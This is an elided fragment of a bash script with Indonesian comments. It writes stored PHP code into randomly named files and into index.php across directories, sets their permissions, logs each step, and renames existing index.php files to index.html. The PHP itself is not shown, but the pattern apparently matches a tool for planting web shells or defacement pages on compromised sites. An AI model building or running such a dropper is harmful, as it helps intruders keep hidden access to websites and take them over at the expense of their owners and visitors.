...
# Kode PHP untuk file acak dan index.php
PHP_CODE_RANDOM=$(cat <<'EOF'
<?php
...
# Fungsi untuk menulis kode PHP ke file
write_php_code_to_file() {
  local path="$1"
  local code="$2"
  echo "$code" > "$path"
  if [ $? -ne 0 ]; then
    local msg="$(date) - Failed to write PHP code to $path"
    echo "$msg" >> "$LOG_FILE"
    return 1
  fi
  return 0
...
upload_php_files() {
  ...
  if ! write_php_code_to_file "$dir/$php_file_name" "$PHP_CODE_RANDOM"; then
    local msg="$(date) - Failed to create random PHP file at $dir/$php_file_name"
    echo "$msg" >> "$LOG_FILE"
  else
    echo "$(date) - Successfully created random PHP file at $dir/$php_file_name" >> "$LOG_FILE"
  fi

  # Menulis kode PHP ke file index.php
  if ! write_php_code_to_file "$dir/$index_php_file_name" "$PHP_CODE_INDEX"; then
    local msg="$(date) - Failed to create index PHP file at $dir/$index_php_file_name"
    echo "$msg" >> "$LOG_FILE"
  else
    echo "$(date) - Successfully created index PHP file at $dir/$index_php_file_name" >> "$LOG_FILE"
  fi
  ...
  if ! chmod 0644 "$dir/$php_file_name" || ! chmod 0644 "$dir/$index_php_file_name"; then
    ...
    echo "$(date) - Successfully set permissions for PHP files in $dir" >> "$LOG_FILE"
  fi
...
rename_index() {
  ...
  if [ -f "$dir/index.php" ]; then
    if ! mv "$dir/index.php" "$dir/index.html"; then
      ...
      echo "$(date) - Successfully renamed index.php to index.html in $dir" >> "$LOG_FILE"
    fi
  fi
}
...
export -f write_php_code_to_file
